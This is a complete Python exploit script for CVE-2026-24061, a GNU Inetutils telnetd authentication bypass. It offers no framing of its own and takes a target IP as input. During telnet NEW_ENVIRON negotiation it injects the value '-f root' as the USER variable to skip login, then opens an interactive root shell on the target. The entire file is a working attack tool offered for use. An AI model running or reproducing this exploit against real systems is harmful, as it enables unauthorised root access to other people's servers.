import socket
import sys
import threading
import argparse
import re

# --- Telnet Protocol Constants (RFC 854) ---
IAC  = 255
DONT = 254
DO   = 253
WONT = 252
WILL = 251
SB   = 250
SE   = 240

# --- Telnet Option Codes (RFC 1572) ---
NEW_ENVIRON = 39
IS   = 0
VAR  = 0
VALUE = 1

# Global state for echo suppression
waiting_for_newline = False
state_lock = threading.Lock()

# Arguments
def parse_arguments():
    parser = argparse.ArgumentParser(
        prog='Telnet__Exploit',
        description='Exploit for CVE-2026-24061 (GNU Inetutils telnetd auth bypass)',
        epilog='Thankyou for used this CVE !!!'
    )
    parser.add_argument('--ip', '-ip' , required=True, help='Target IP address or hostname')
    parser.add_argument('--port', '-p', type=int, default=23, help='Target port (default: 23)')
    return parser.parse_args()

# Negotiation
def handle_negotiation(sock, cmd, opt):
    if cmd == DO and opt == NEW_ENVIRON:
        sock.sendall(bytes([IAC, WILL, NEW_ENVIRON]))  # "Yes, I support NEW_ENVIRON"
    elif cmd == DO:
        sock.sendall(bytes([IAC, WONT, opt]))          # Refuse other options
    elif cmd == WILL:
        sock.sendall(bytes([IAC, DO, opt]))            # Accept what server wants to do

# sub-Negotiation
def handle_subnegotiation(sock, sb_data, user_payload):
    """Send malicious USER environment variable when server asks for it"""
    if len(sb_data) > 0 and sb_data[0] == NEW_ENVIRON:
        env_msg = (
            bytes([IAC, SB, NEW_ENVIRON, IS, VAR]) +
            b'USER' +
            bytes([VALUE]) +
            user_payload.encode('ascii') +  # "-f root"
            bytes([IAC, SE])
        )
        sock.sendall(env_msg)

def process_telnet_stream(data, sock, user_payload):
    """Parse incoming data: handle controls + clean output + suppress echo"""
    global waiting_for_newline
    clean_output = b''
    i = 0
    while i < len(data):
        if data[i] == IAC and i + 1 < len(data):
            cmd = data[i + 1]
            if cmd in (DO, DONT, WILL, WONT) and i + 2 < len(data):
                handle_negotiation(sock, cmd, data[i + 2])
                i += 3
                continue
            elif cmd == SB:
                # Find end of subnegotiation
                se_idx = i + 2
                while se_idx < len(data) - 1:
                    if data[se_idx] == IAC and data[se_idx + 1] == SE:
                        break
                    se_idx += 1
                if se_idx < len(data) - 1:
                    handle_subnegotiation(sock, data[i + 2:se_idx], user_payload)
                    i = se_idx + 2
                    continue
            i += 2
        else:
            clean_output += bytes([data[i]])
            i += 1

    # Remove ANSI escape sequences (colors, cursor movement, etc.)
    ansi_escape = re.compile(rb'\x1b\[[0-?]*[ -/]*[@-~]')
    filtered_data = ansi_escape.sub(b'', clean_output)

    # Suppress echoed command (hide what we just typed until newline)
    with state_lock:
        if waiting_for_newline:
            newline_pos = -1
            for idx, byte_val in enumerate(filtered_data):
                if byte_val in (10, 13):  # LF or CR
                    newline_pos = idx
                    break
            if newline_pos != -1:
                filtered_data = filtered_data[newline_pos + 1:]
                waiting_for_newline = False
            else:
                return b''  # Still waiting for newline â†’ hide this chunk

    return filtered_data

def socket_reader_thread(sock, user_payload):
    """Background thread: read from server, clean, and print"""
    try:
        while True:
            raw_data = sock.recv(4096)
            if not raw_data:
                break
            display_data = process_telnet_stream(raw_data, sock, user_payload)
            if display_data:
                sys.stdout.buffer.write(display_data)
                sys.stdout.flush()
    except (ConnectionResetError, BrokenPipeError, OSError):
        pass
    finally:
        print("\n[*] Connection closed by server.")

def main():
    args = parse_arguments()
    user_payload = "-f root"

    try:
        client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_sock.settimeout(8)
        print(f"[*] Connecting to {args.ip}:{args.port} ...")
        client_sock.connect((args.ip, args.port))
        client_sock.settimeout(None)
        print("[*] Connected! Sending exploit during negotiation...")
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        sys.exit(1)

    # Start listener thread
    threading.Thread(
        target=socket_reader_thread,
        args=(client_sock, user_payload),
        daemon=True
    ).start()

    print("[*] Interactive session started. Type commands and press Enter.")
    print("    Press Ctrl+C to quit.\n")

    try:
        while True:
            char = sys.stdin.buffer.read(1)
            if not char:
                break
            if char[0] in (10, 13):  # Enter pressed
                with state_lock:
                    global waiting_for_newline
                    waiting_for_newline = True
            client_sock.sendall(char)
    except KeyboardInterrupt:
        print("\n[*] User requested exit.")
    finally:
        client_sock.close()
        print("[*] Socket closed.")

if __name__ == "__main__":
    main()
